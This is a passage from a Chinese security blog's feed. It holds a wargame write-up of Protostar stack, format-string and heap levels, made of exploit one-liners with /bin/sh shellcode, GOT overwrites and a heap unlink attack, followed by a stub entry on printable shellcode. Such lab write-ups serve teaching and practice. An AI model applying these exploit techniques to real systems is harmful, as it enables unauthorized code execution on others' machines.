-<h2 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack3 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 08048424    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x24\x84\x04\x08'"</span> | ./stack3</div><div class="line">calling <span class="keyword">function</span> pointer, jumping to 0x08048424</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
-<h2 id="stack-4"><a href="#stack-4" class="headerlink" title="stack 4"></a>stack 4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack4 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 080483f4    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 76*'a'+'\xf4\x83\x04\x08'"</span>|./stack4</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
-<h2 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : disabled</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
-<p>系统没开ASLR。让程序崩溃，调试core dump获得stack address。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print 0x4c*'a'+'\x10\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack5</div></pre></td></tr></table></figure></p>
-<h2 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h2><p>return addr =&gt; addr(ret) =&gt; stack addr</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048508</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x08\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
-<h2 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048553</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x53\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
-<h2 id="format0"><a href="#format0" class="headerlink" title="format0"></a>format0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 0x40*'a'+'\xef\xbe\xad\xde'" | xargs ./format0</span></div><div class="line">you have hit the target correctly :)</div></pre></td></tr></table></figure>
-<h2 id="format1"><a href="#format1" class="headerlink" title="format1"></a>format1</h2><p><code>%128$n</code>代表第128个参数，argv会放在栈上。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\x38\x96\x04\x08\x08\x04aaa%128\$n'" | xargs ./format1                                                                       aaayou have modified the target :)</span></div></pre></td></tr></table></figure>
-<h2 id="format2"><a href="#format2" class="headerlink" title="format2"></a>format2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8048477 &lt;vuln+35&gt;: call   0x804835c &lt;fgets@plt&gt;</div><div class="line">   0x804847c &lt;vuln+40&gt;: lea    eax,[ebp-0x208]</div><div class="line">   0x8048482 &lt;vuln+46&gt;: mov    DWORD PTR [esp],eax</div><div class="line">=&gt; 0x8048485 &lt;vuln+49&gt;: call   0x804837c &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">   0x804848a &lt;vuln+54&gt;: mov    eax,ds:0x80496e4</div><div class="line">   0x804848f &lt;vuln+59&gt;: cmp    eax,0x40</div><div class="line">   0x8048492 &lt;vuln+62&gt;: jne    0x80484a2 &lt;vuln+78&gt;</div><div class="line">   0x8048494 &lt;vuln+64&gt;: mov    DWORD PTR [esp],0x8048590</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd440 --&gt; 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">0004| 0xffffd444 --&gt; 0x200</div><div class="line">0008| 0xffffd448 --&gt; 0xf7<span class="built_in">fc</span>2c20 --&gt; 0xfbad2288</div><div class="line">0012| 0xffffd44c --&gt; 0xf7fec308 (&lt;_dl_check_map_versions+632&gt;:  mov    edi,eax)</div><div class="line">0016| 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div></pre></td></tr></table></figure>
-<p>exploit:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\xe4\x96\x04\x08%4\$060x%4\$n'" | ./format2</span></div><div class="line">.0000000000000000000000000000000000000000000000000000080496e4</div><div class="line">you have modified the target :)</div></pre></td></tr></table></figure>
-<h2 id="format3"><a href="#format3" class="headerlink" title="format3"></a>format3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\xf4\x96\x04\x08%12\$016930112x%12\$n'"</span> | ./format3</div></pre></td></tr></table></figure>
-<p>看了我的方法还是有点弱- -，基本就是一字节写比较好的方法</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">'print "\xf4\x96\x04\x08"+"\xf5\x96\x04\x08"+"\xf6\x96\x04\x08"+"\xf7\x96\x04\x08"+"%52x%12$n%13$n%14$n%15$n"'</span> | ./format3</div><div class="line">target is 44444444 :(</div></pre></td></tr></table></figure>
-<h2 id="format4"><a href="#format4" class="headerlink" title="format4"></a>format4</h2><p>写exit的GOT表中的数据,<code>GOT[&quot;exit&quot;]=0x08049724</code>，单字节写入。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08'+'%0164x%4\$n%0208x%5\$n%0128x%6\$n%260x%7\$n'"</span> | ./format4</div></pre></td></tr></table></figure>
-<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>winner = 0x08048464</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 72*'a'+'\x64\x84\x04\x08'" | xargs ./heap0</span></div><div class="line">data is at 0x804a008, fp is at 0x804a050</div><div class="line">level passed</div></pre></td></tr></table></figure>
-<h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p>GOT[“puts”] = 0x08049774<br>winner = 0x08048494<br>没啥说的，把第二个指针覆盖为puts的got地址，第二次strcpy把winner写入puts的got表中</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap1 $(python -c "print 20 * 'a' + '\x74\x97\x04\x08'")  $(python -c "print '\x94\x84\x04\x08'")</span></div><div class="line">and we have a winner @ 1491862467</div></pre></td></tr></table></figure>
-<h2 id="heap2"><a href="#heap2" class="headerlink" title="heap2"></a>heap2</h2><p>很明显的UAF，struct auth = 36字节，先创建auth，再free再用strdup分配36字节大小的空间即可。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[ auth = (nil), service = (nil) ]</div><div class="line">auth aaaaa</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">reset</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div><div class="line">login</div><div class="line">you have logged <span class="keyword">in</span> already!</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div></pre></td></tr></table></figure>
-<h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><p>unlink导致任意地址写</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap3 $(python -c 'print "A" * 4 + "\x68\x64\x88\x04\x08\xc3"') $(python -c 'print "A" * 32 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 8 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC</span></div><div class="line">that wasn<span class="string">'t too bad now, was it? @ 1491865342</span></div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;stack0&quot;&gt;&lt;a href=&quot;#stack0&quot; class=&quot;headerlink&quot; title=&quot;stack0&quot;&gt;&lt;/a&gt;stack0&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code
-    
-    </summary>
-    
-      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
-    
-      <category term="wargame" scheme="http://weaponx.site/tags/wargame/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>生成自己的Alphanumeric/Printable shellcode</title>
-    <link href="http://weaponx.site/2017/04/07/%E7%94%9F%E6%88%90%E8%87%AA%E5%B7%B1%E7%9A%84Alphanumeric-Printable-shellcode/"/>
-    <id>http://weaponx.site/2017/04/07/生成自己的Alphanumeric-Printable-shellcode/</id>
-    <published>2017-04-07T08:40:22.000Z</published>
-    <updated>2017-04-12T02:35:38.181Z</updated>
-    
-    <content type="html"><![CDATA[<p>文章已经发表到360播报:<a href="http://bobao.360.cn/learning/detail/3720.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3720.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;文章已经发表到360播报:&lt;a href=&quot;http://bobao.360.cn/learning/detail/3720.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bobao.360.cn/learning/detail/3
-    
-    </summary>
-    
-      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
-    
-      <category term="wargame" scheme="http://weaponx.site/tags/wargame/"/>
     
   </entry>
   
